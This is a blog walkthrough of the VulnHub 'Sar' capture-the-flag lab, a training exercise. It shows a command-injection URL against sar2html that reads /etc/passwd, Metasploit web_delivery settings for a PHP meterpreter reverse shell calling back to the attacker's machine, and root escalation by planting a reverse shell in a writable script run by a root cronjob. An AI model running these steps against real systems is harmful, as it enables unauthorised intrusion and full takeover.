<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Sar: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/sar-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-08T05:26:21+00:00">March 8, 2020</time><time class="updated" datetime="2025-06-10T20:10:42+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Another walkthrough for the vulnhub machine “sar” which is an easy lab designed by the author to give a taste to the OSCP Labs. The challenge is simple just like any other CTF challenge where you identify two flags “user.txt” and “root.txt” with the help of your pentest skill.</span></p>
<p><span style="color: #000000;">Download from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/sar-1,425/">https://www.vulnhub.com/entry/sar-1,425/</a></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies </strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Dirb</span></li>
<li><span style="color: #000000;">Exploit DB</span></li>
<li><span style="color: #000000;">Exploit</span></li>
<li><span style="color: #000000;">Metasploit for RCE</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation </strong></span>
<ul>
<li><span style="color: #000000;">Abusing Cronjob</span></li>
<li><span style="color: #000000;">Abusing Writable file permission</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><u>Walkthrough </u></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">So, as we always start with netdiscover to get the IP of the VM machine and the IP of the host I’ve found is 192.168.29.212.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NUDeWlQWDq4/XmR8LNqs3MI/AAAAAAAAi60/nMoLP1CvQus__KRDVmZuET9GAhVf7YvzQCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Let’s proceed with network scan using Nmap aggressive scan as given below.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.29.212</pre>
<p><span style="color: #000000;">hmmm!! So here I enumerate port 80 is only the single port open for HTTP service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-liUIATaKLQA/XmR8N0_MrAI/AAAAAAAAi7M/llCNQ-33I8cYrHBt6cz-_udOxUZ0hOchQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><strong><span style="color: #800000;">Enumeration</span></strong></h3>
<p><span style="color: #000000;">So I navigate to the web browser and explore the host IP and obtain the Apache default page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DiBfecXfgQ0/XmR8OMZCWwI/AAAAAAAAi7Q/aO5Md7hRlKEOMXCtmNCvYnkZ7iMCH3bkwCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Without wasting time, I run DIRB – for directory brute force attack for enumerating web directories and ran the following command:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.29.212</pre>
<p><span style="color: #000000;">Luckily, I found robots.txt is available which may help me to move ahead.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m4edhG4_qSY/XmR8Od0ZIaI/AAAAAAAAi7U/BM_6QCDvg2YJLhOnhV-LH3SPXW52NJ_awCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So I explored the URL: http://192.168.29.212/robots.txt and found an entry for “sar2html” which is a web-based frontend for performance monitoring. It converts sar binary data to graphical format and keep historical data in its library.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yv28vLjtzCE/XmR8OpAcjwI/AAAAAAAAi7Y/XdPf1c9sEj8mRYOsO54vBqngRapRleIJgCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">I’ve browsed /sar2html in the web browser, and the resulting web page displays its default configuration along with version disclosure, which might help me find the exploit if available on the internet.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GlDUcpppMG4/XmR8O05Md1I/AAAAAAAAi7c/_O5pQmYOoBEVSwkIHK83utT_UkQTvWWxQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So, I looked up for its exploit and fortunately got an exploit link from the Exploit DB. As a result, the installed application was vulnerable to remote code execution.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-45A_7TxDp4s/XmR8PFj5tII/AAAAAAAAi7g/XH9R_1pRnXwoJ97NZPYZvf6cla7xbr8-wCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">With the help of the exploit listed above, we tried to run some arbitrary command and, as shown in the image below, we were able to execute system commands through a web URL.</span></p>
<pre class="lang:default decode:true">http://192.168.29.212/sar2html/index.php?plot=; tail "/etc/passwd"</pre>
<p><span style="color: #000000;">So, we try to run the URL above in the web browser to get the user account details and, as a result, we successfully get the desired output.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--ICif19_dlU/XmR8PrmsGHI/AAAAAAAAi7k/ecxnhoWh9rY8iM9gos0I7VwybuMG2TxjgCLcBGAsYHQ/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">It was time to exploit this vulnerability by spawning the host machine shell so we required to prepare a malicious PHP code with the help of the Metasploit “Web Delivery” Module.</span></p>
<pre class="lang:default decode:true">use/exploit/multi/script/web_delivery
set target 1 &lt;php&gt;
set lhost 192.168.29.208
set lport 4444
set payload php/meterpreter/reverse_tcp
exploit</pre>
<p><span style="color: #000000;">This will generate a malicious PHP code which you’ll use for execution on the web URL as done above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S-fg5TlQvzQ/XmR8PsPdClI/AAAAAAAAi7o/fXoOMiRVlTYEyn3smUNbs3CyxeKbWRKEACLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">So, I copied the above malicious code and paste it inside the URL to get the back connection of the host through the URL execution.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p4eiYD4vQBw/XmR8KyKGT0I/AAAAAAAAi6s/QiPeu10Anu0vfqjSuwja3U0gQqeFTXLwACLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Booom!!! We hit the goal and obtain the meterperter session the host machine, alone this we also find the 1<sup>st</sup> flag user.txt flag inside /home/love/Desktop.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Nyw4JcRME5A/XmR8LGsazOI/AAAAAAAAi6w/lZSVbVci3SAol1b7oh8N1ah6rKpWrQsbQCLcBGAsYHQ/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now, to hunt for the final flag that would be inside the / root directory, we need to get a high privilege shell. We eventually searched for crontabs and found the bash script “finally.sh” to be executed along with sudo as a cronjob for after every 5 minutes.</span></p>
<p><span style="color: #000000;">By peeping inside /var/www/html I found two bash scripts “finally.sh and write.sh” moreover the write.sh has ALL permissions to perform READ, WRITE and EXECUTE operation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9-Wp2vqG9B4/XmR8MH52nlI/AAAAAAAAi64/K8PcJhoDuPkC2dUnt0RQPFXjM7dw46jqACLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">So, we read that finally.sh which is a bash script that will execute write.sh every 5 minutes as a cronjob. Now, this was the moment when we could abuse the weak configuration of a cronjob on finally.sh that has a link to the write.sh script that has ALL permission.</span></p>
<pre class="lang:default decode:true">cd /var/www/html
cat finally.sh
cat write.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q4vnEyxJ2nI/XmR8MdDpuZI/AAAAAAAAi68/R_7-LCk1-Nw2BLEmfzAS275VNZZ803XdgCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Since we can abuse write.sh file to execute a malicious file, therefore as I use pentest-monkey: php_reverse_shell in order to obtain a high privilege shell via netcat session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X5y0UV8uF2M/XmR8MjF3ozI/AAAAAAAAi7A/v3c5mj7Pam4sLn4plbdn4z_8kcr61ZFDACLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">So, I download the shell.php file inside /var/www/html and execute the following command to append a line inside the write.sh script to run the shell.php file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2QVMfT2jZuU/XmR8M9YIn9I/AAAAAAAAi7E/X3mVZYZZaToK89BiH_o4LkkecDb6YKGIgCLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">On the other hand, I start the netcat listener and then waiting for the reverse connection. Since we know that the cronjob was scheduled to run finally.sh script at the end of 5 mint, this may help us to get the root shell.</span></p>
<p><span style="color: #000000;">As a result, we got the netcat session as root and get the root.txt script, finished the task.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-a_CI1zAh5LQ/XmR8NS4n_oI/AAAAAAAAi7I/TuTclB23_usDQ0iZYKooQjUBI3HsXIRcQCLcBGAsYHQ/s1600/16.png"/></p>
<p><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
